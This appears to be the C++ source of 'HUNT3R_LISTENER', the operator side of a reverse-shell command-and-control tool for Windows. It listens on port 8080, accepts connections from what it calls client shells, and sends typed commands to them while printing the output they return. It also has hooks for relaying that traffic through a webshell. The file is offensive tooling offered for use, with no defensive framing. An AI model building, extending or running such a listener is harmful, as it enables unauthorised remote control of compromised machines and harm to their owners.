// HUNT3R_LISTENER
//
//------------------------------------------------------------------------------------------INCLUDES
#include <iostream>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <string>
#include <thread>
#include <mutex>
#include <Windows.h>

#pragma comment(lib, "ws2_32.lib")


//------------------------------------------------------------------------------------------MUTEX -> mtx
std::mutex mtx; // Mutex -> Sync Output 

std::string xClientID = "XCLIENT00001";


//------------------------------------------------------------------------------------------HANDLE CLIENT SHELL SESSION FUNCTION
void xHandleClient(SOCKET clientSocket) {
    char yBuffer[1024];
    int yBytesRead;

    while (true) {
        yBytesRead = recv(clientSocket, yBuffer, sizeof(yBuffer), 0);
        if (yBytesRead <= 0) {
            std::cerr << "Connection Closed or Error." << std::endl;
            closesocket(clientSocket);
            return;
        }

        std::string yCommand(yBuffer, yBytesRead); // Received Data -> Output
        {
            std::lock_guard<std::mutex> lock(mtx);
            std::cout << std::endl << "Received Output: " << yCommand << std::endl;

            //xSendAjaxRequest(xClientID, yCommand); // Received Output -> Ajax -> Webshell
        }
    }
}


//------------------------------------------------------------------------------------------INPUT FUNCTION
void xInputThread(SOCKET clientSocket) {
    while (true) {
        std::string yUserInput;
        std::cout << "Enter a Command: ";
        std::getline(std::cin, yUserInput);

        yUserInput += ' '; // Add Space

        send(clientSocket, yUserInput.c_str(), yUserInput.length(), 0); // Send -> Client

        if (yUserInput == "exit ") {
            break; // exit -> End Input Loop
        }
    }
}


//------------------------------------------------------------------------------------------AJAX INPUT FUNCTION
void xAjaxInput(SOCKET clientSocket, const std::string& command) {
    send(clientSocket, command.c_str(), command.length(), 0); // Command -> Client
}


//------------------------------------------------------------------------------------------LISTENER STARTUP FUNCTION
void xStartListener(int yPort) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup Failed!" << std::endl;
        return;
    }

    SOCKET listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listener == INVALID_SOCKET) {
        std::cerr << "Socket Creation Failed!" << std::endl;
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(yPort);

    if (bind(listener, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind Failed!" << std::endl;
        closesocket(listener);
        WSACleanup();
        return;
    }

    if (listen(listener, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen Failed!" << std::endl;
        closesocket(listener);
        WSACleanup();
        return;
    }

    std::cout << "Listening for Incoming Connections on Port " << yPort << "..." << std::endl;

    while (true) {
        SOCKET clientSocket = accept(listener, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed!" << std::endl;
            closesocket(listener);
            WSACleanup();
            return;
        }

        std::cout << "Received an Incoming Connection!" << std::endl;

        std::thread(xHandleClient, clientSocket).detach(); // Start Thread -> Handle Client Shell
        std::thread(xInputThread, clientSocket).detach(); // Start Thread -> Shell Input
    }

    closesocket(listener);
    WSACleanup();
}


//------------------------------------------------------------------------------------------MAIN FUNCTION
int main() {
    SetConsoleOutputCP(CP_UTF8);
    xStartListener(8080); // Call -> xStartListener Function
    return 0;
}
